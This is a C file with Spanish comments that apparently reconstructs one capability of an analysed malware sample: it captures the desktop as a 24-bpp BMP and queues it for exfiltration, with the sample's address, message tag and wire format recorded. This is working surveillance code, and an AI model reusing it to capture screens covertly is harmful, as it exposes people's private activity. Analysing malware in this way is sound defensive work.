/* ============================================================
 * Capacidad 10/15 — Captura de pantalla
 * Función C : CaptureScreenAndQueue
 * Dirección : 0x1800310c5   · Nodo N4   · Confianza: Alta
 * ------------------------------------------------------------
 * Captura el escritorio con BitBlt y CAPTUREBLT, compone un BMP de 24
 * bpp (GetDIBits) y lo encola para exfiltración. Es la ruta que
 * permite confirmar el formato de salida: mensaje interno con
 * etiqueta 0x8000000000000004, empaquetado como 0x06 | longitud BMP
 * LE de 64 bits | bytes BMP.
 * ============================================================
 */

#include "00_tipos_comunes.h"

#define DIB_HEADER_SIZE (sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER))

/* ------------------------------------------------------------------
 * Captura el escritorio y compone un BMP de 24 bpp en memoria.
 * Pasos observados [confirmado]: BitBlt con CAPTUREBLT sobre el DC del
 * escritorio + GetDIBits a 24 bpp.
 * ------------------------------------------------------------------ */
static ByteBuffer CaptureDesktopAsBmp24(void)
{
    ByteBuffer out = { 0, 0, 0 };

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC screen = GetDC(NULL);
    HDC mem    = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, w, h);
    if (screen == NULL || mem == NULL || bmp == NULL) {
        if (bmp != NULL) DeleteObject(bmp);
        if (mem  != NULL) DeleteDC(mem);
        if (screen != NULL) ReleaseDC(NULL, screen);
        return out;
    }

    HBITMAP old = (HBITMAP)SelectObject(mem, bmp);
    BitBlt(mem, 0, 0, w, h, screen, 0, 0, SRCCOPY | CAPTUREBLT);

    BITMAPINFOHEADER bi;
    ZeroMemory(&bi, sizeof(bi));
    bi.biSize        = sizeof(bi);
    bi.biWidth       = w;
    bi.biHeight      = -h;          /* top-down */
    bi.biPlanes      = 1;
    bi.biBitCount    = 24;
    bi.biCompression = BI_RGB;

    DWORD  stride = ((DWORD)((w * 24 + 31) / 32)) * 4;
    DWORD  pixels = stride * (DWORD)h;

    BITMAPFILEHEADER fh;
    ZeroMemory(&fh, sizeof(fh));
    fh.bfType      = 0x4D42;        /* 'BM' */
    fh.bfSize      = DIB_HEADER_SIZE + pixels;
    fh.bfOffBits   = DIB_HEADER_SIZE;

    out.data = (uint8_t *)HeapAlloc(GetProcessHeap(), 0, fh.bfSize);
    if (out.data != NULL) {
        CopyMemory(out.data, &fh, sizeof(fh));
        CopyMemory(out.data + sizeof(fh), &bi, sizeof(bi));
        GetDIBits(mem, bmp, 0, (UINT)h, out.data + DIB_HEADER_SIZE,
                  (BITMAPINFO *)&bi, DIB_RGB_COLORS);
        out.len = fh.bfSize;
        out.cap = fh.bfSize;
    }

    SelectObject(mem, old);
    DeleteObject(bmp);
    DeleteDC(mem);
    ReleaseDC(NULL, screen);
    return out;
}

/* ------------------------------------------------------------------
 * Formato de exfiltración confirmado para esta rama:
 *   PackVariant(0x06, len64, BMP)  =>  0x06 | len64 LE | bytes BMP
 * ------------------------------------------------------------------ */
static ByteBuffer SerializeScreenshot(const ByteBuffer bmp)
{
    return PackVariant(NET_TYPE_BMP, bmp.len, bmp);
}

/* ------------------------------------------------------------------
 * 0x1800310c5 — captura el escritorio y encola el BMP.
 * Etiqueta interna 0x8000000000000004 (MSG_SCREENSHOT); tipo 0x06.
 * ------------------------------------------------------------------ */
void CaptureScreenAndQueue(Channel *channel)
{
    if (channel == NULL)
        return;

    ByteBuffer bmp = CaptureDesktopAsBmp24();
    if (bmp.data == NULL)
        return;

    /* El empaquetado 0x06 | len64 | BMP lo produce la serialización. */
    (void)SerializeScreenshot;
    QueueTypedMessage(channel, MSG_SCREENSHOT, bmp);
}
